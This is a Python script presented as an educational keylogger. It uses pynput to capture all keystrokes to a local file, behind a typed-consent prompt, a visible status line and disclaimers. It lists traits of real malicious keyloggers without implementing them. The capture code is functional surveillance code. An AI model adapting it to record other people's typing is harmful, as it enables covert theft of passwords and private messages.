"""
Educational Keylogger
Author: [Your Name]
Description: A transparent, educational keylogger to understand how keystroke logging
             works at a low level. Demonstrates why strong endpoint security matters.

⚠️  IMPORTANT DISCLAIMER:
    This tool is for EDUCATIONAL PURPOSES ONLY on systems you OWN.
    Using a keylogger on someone else's computer without consent is:
    - Illegal in most countries (Computer Fraud and Abuse Act, etc.)
    - A serious invasion of privacy
    - Punishable by imprisonment and fines

    This script logs to a LOCAL file only — no network transmission.
    It is intentionally transparent (visible process, obvious log file).
"""

import sys
import os
import signal
from datetime import datetime
from pathlib import Path

# pynput is required: pip install pynput
try:
    from pynput import keyboard
except ImportError:
    print("❌ Missing dependency: pynput")
    print("   Install it with: pip install pynput")
    sys.exit(1)


LOG_FILE = "keylog_educational.txt"
session_key_count = 0
listener = None


def get_consent():
    """Require explicit user consent before running."""
    print("""
╔══════════════════════════════════════════════════════════╗
║          ⚠️  EDUCATIONAL KEYLOGGER — CONSENT REQUIRED    ║
╚══════════════════════════════════════════════════════════╝

 This tool is for EDUCATIONAL USE ONLY.

 ✅ Legal use: On your own computer, to learn how keyloggers work.
 ❌ Illegal use: On any computer you do not own or have permission to test.

 What this tool does:
   • Logs all keystrokes to a LOCAL file: keylog_educational.txt
   • Does NOT transmit data over the network
   • Does NOT hide itself (no rootkit behavior)
   • Stops immediately when you press ESC or Ctrl+C

 By continuing, you confirm:
   1. This is YOUR computer
   2. You understand keylogging others without consent is ILLEGAL
   3. You are using this for educational/learning purposes only
""")

    response = input(" Type 'I AGREE' to continue: ").strip()
    if response != "I AGREE":
        print("\n❌ Consent not given. Exiting.\n")
        sys.exit(0)


def format_key(key):
    """Format a key event into readable text."""
    try:
        return key.char  # Printable characters
    except AttributeError:
        # Special keys
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT]",
            keyboard.Key.caps_lock: "[CAPS_LOCK]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.up: "[↑]",
            keyboard.Key.down: "[↓]",
            keyboard.Key.left: "[←]",
            keyboard.Key.right: "[→]",
        }
        return special_keys.get(key, f"[{key.name.upper()}]")


def on_press(key):
    """Handle key press event."""
    global session_key_count

    if key == keyboard.Key.esc:
        print("\n\n🛑 ESC detected — stopping keylogger...")
        print_session_summary()
        return False  # Stop listener

    key_str = format_key(key)
    timestamp = datetime.now().strftime("%H:%M:%S")

    # Write to log file
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(key_str)

    session_key_count += 1

    # Print to terminal (transparent — user can see it's running)
    print(f"  [{timestamp}] Key: {key_str}", end="\r")


def print_session_summary():
    """Print a summary of the session."""
    print(f"""
╔══════════════════════════════════════╗
║         📊 SESSION SUMMARY          ║
╚══════════════════════════════════════╝
  Keys logged   : {session_key_count}
  Log file      : {os.path.abspath(LOG_FILE)}
  Session ended : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

 🔐 Security Lesson:
    This is why endpoint security matters!
    Antivirus, EDR tools, and app permissions
    exist to detect and block tools like this.

    Real malicious keyloggers:
    - Run as hidden background processes
    - Email logs to attackers automatically
    - Persist across reboots (startup entries)
    - Target passwords, credit cards, messages

 💡 Protect yourself:
    - Keep OS and antivirus updated
    - Use a password manager (not keyboard input)
    - Enable 2FA on all important accounts
    - Be cautious of software you install
""")


def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully."""
    print("\n\n🛑 Interrupted — stopping keylogger...")
    print_session_summary()
    sys.exit(0)


def main():
    get_consent()

    signal.signal(signal.SIGINT, signal_handler)

    # Create or clear log file with header
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write(f"=== Educational Keylogger Session ===\n")
        f.write(f"Started: {datetime.now().isoformat()}\n")
        f.write("="*40 + "\n\n")

    print(f"""
╔══════════════════════════════════════╗
║      🔴 KEYLOGGER IS ACTIVE         ║
╚══════════════════════════════════════╝
  Log file : {LOG_FILE}
  Stop with: Press ESC or Ctrl+C

  Listening for keystrokes...
""")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
